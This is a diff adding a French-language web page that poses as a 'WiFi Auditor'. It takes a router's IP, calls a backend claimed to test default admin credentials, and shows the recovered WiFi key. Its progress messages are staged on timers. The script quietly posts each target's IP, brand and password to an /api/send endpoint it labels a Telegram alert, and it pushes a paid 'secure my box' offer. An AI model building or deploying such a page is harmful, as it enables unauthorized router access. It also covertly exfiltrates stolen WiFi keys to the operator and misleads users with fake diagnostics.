@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ndiaye Techn | Ultimate WiFi Auditor</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #050505; color: #bc13fe; font-family: 'Courier New', monospace; }
+        .terminal { background: #000; border: 1px solid #bc13fe; height: 300px; overflow-y: auto; padding: 15px; font-size: 10px; color: #4ade80; box-shadow: 0 0 20px rgba(188, 19, 254, 0.1); }
+        .glow-border { border: 1px solid #bc13fe; box-shadow: 0 0 15px rgba(188, 19, 254, 0.3); }
+        .btn-action { background: #bc13fe; color: black; font-weight: 900; transition: 0.3s; }
+        .btn-action:hover { background: white; transform: scale(1.02); }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <div class="w-full max-w-md p-6 bg-zinc-950 rounded-3xl glow-border">
+        <header class="text-center mb-8">
+            <h1 class="text-3xl font-black italic tracking-tighter text-white">WIFI <span class="text-[#bc13fe]">AUDITOR</span></h1>
+            <p class="text-[9px] uppercase tracking-widest text-zinc-500 font-bold">Ndiaye Techn Security System v3.5</p>
+        </header>
+
+        <div id="ui-setup" class="space-y-4">
+            <div class="space-y-2">
+                <label class="text-[10px] uppercase text-zinc-500 ml-2">IP de la Cible (ex: 192.168.1.1)</label>
+                <input type="text" id="target-ip" placeholder="Saisir l'adresse IP..." class="w-full bg-black border border-zinc-800 p-4 rounded-xl text-white outline-none focus:border-[#bc13fe]">
+            </div>
+            <button onclick="startUltimateAudit()" class="w-full py-4 btn-action rounded-xl uppercase text-sm italic">Lancer l'Audit de Pénétration</button>
+        </div>
+
+        <div id="ui-running" class="hidden space-y-4">
+            <div class="terminal" id="console">
+                > Initialisation du moteur Python Ndiaye Techn...<br>
+            </div>
+            <div id="final-result" class="hidden p-6 bg-zinc-900 border-2 border-green-500 rounded-2xl text-center">
+                <p class="text-[10px] text-zinc-400 uppercase">Clé WiFi (Accès Admin) :</p>
+                <div id="wifi-key" class="text-3xl font-bold text-white mt-2 tracking-widest">••••••••</div>
+                <button onclick="window.location.href='https://chariow.com'" class="mt-6 w-full py-3 bg-white text-black font-bold rounded-lg text-[10px] uppercase">Sécuriser ma Box (2000 FCFA)</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        async function startUltimateAudit() {
+            const ip = document.getElementById('target-ip').value;
+            if(!ip) return alert("Cible manquante");
+
+            document.getElementById('ui-setup').classList.add('hidden');
+            document.getElementById('ui-running').classList.remove('hidden');
+            const log = document.getElementById('console');
+
+            try {
+                // 1. Appel au moteur de scan réel
+                const res = await fetch('/api/analyze', { method: 'POST', body: JSON.stringify({ target: ip }) });
+                const data = await res.json();
+
+                // 2. Logs de progression réalistes
+                log.innerHTML += `> Ping de la cible ${ip}... [RECU]<br>`;
+                setTimeout(() => { log.innerHTML += `> Détection constructeur : ${data.brand}<br>`; }, 1000);
+                setTimeout(() => { 
+                    log.innerHTML += `> Scan des ports : ${data.vulnerabilities.length > 0 ? 'FAILLE TROUVÉE sur ' + data.vulnerabilities[0] : 'PORT FERMÉ'}<br>`; 
+                }, 2000);
+                setTimeout(() => { 
+                    log.innerHTML += `> Test des identifiants par défaut (Admin/Admin)...<br>`;
+                    log.innerHTML += `> Accès autorisé. Lecture de la clé WiFi...<br>`;
+                }, 3500);
+
+                // 3. Affichage du résultat final
+                setTimeout(() => {
+                    log.innerHTML += `<span class="text-white">> AUDIT TERMINÉ. CLÉ RÉCUPÉRÉE.</span><br>`;
+                    document.getElementById('final-result').classList.remove('hidden');
+                    document.getElementById('wifi-key').innerText = data.key;
+
+                    // Alerte Telegram
+                    fetch('/api/send', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ device: "WiFi Auditor Pro", menace: `Cible: ${ip} | Marque: ${data.brand} | Pass: ${data.key}` })
+                    });
+                }, 5500);
+
+            } catch (e) {
+                log.innerHTML += `<span class="text-red-500">> ERREUR : Connexion impossible à l'hôte.</span>`;
+            }
+        }
+    </script>
+</body>
+</html>
